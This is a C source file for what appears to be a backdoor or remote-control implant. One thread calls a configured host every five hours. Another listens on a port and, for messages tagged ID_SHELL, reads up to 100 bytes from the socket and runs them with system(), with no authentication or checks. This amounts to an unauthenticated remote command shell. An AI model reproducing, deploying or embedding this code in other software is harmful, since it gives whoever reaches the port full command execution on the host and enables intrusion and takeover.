#include "contain.h"
#include <unistd.h>
#include "config.h"
#include "socket_control.h"
#include "project_head.h"
#include "pthreadxsx.h"


//=============================listen=======================
int connect_host()
{
	char ipaddr[30];
	char port[10];
	readcfg("ip",ipaddr);
	readcfg("ctosport",port);
	
	DEBUGS(ipaddr);
	DEBUGS(port);
	
	address_x addr;
	address_init(&addr,ipaddr,atoi(port));
	int sockfd = create_socket_x();
	
	if(sockfd == -1)
		return false;
	if( connect_x(sockfd,&addr) == -1)
		return false;
	close(sockfd);
}



void* timer_connect_host(void* argument)
{
	while(1)
	{
		connect_host();
		sleep(3600*5);
	}

}


//--------------------------listen---------------------------


int exeshell(int fd)
{
	char shell[100] = {0};
	read(fd,shell,100);
	system(shell);
}




void* readsocket(void * argument)
{
	int fd = *((int*)argument);
	free((int*)argument);

	U_MSG msgbuff;
	int seek = read(fd,&msgbuff,sizeof(msgbuff));
	if(seek!=sizeof(msgbuff))
	{
		return NULL;
	}
	int uid = *(int*)(&msgbuff);
	switch(uid)
	{
		case ID_SHELL:
			exeshell(fd);
			break;
		default:
			break;
	}
}



void* const_listen_host(void* argument)
{
	char port[10];
	readcfg("stocport",port);
	DEBUGS(port);
	int sockfd = create_socket_x();
	if(sockfd == -1)
		return 0;
	bind_x(sockfd,atoi(port));
	listen_x(sockfd);

	while(1)
	{
		int * fd = (int*)malloc(sizeof(int));
		*fd = accept_x(sockfd,NULL);
		pthread_run(readsocket,fd);
	}
}















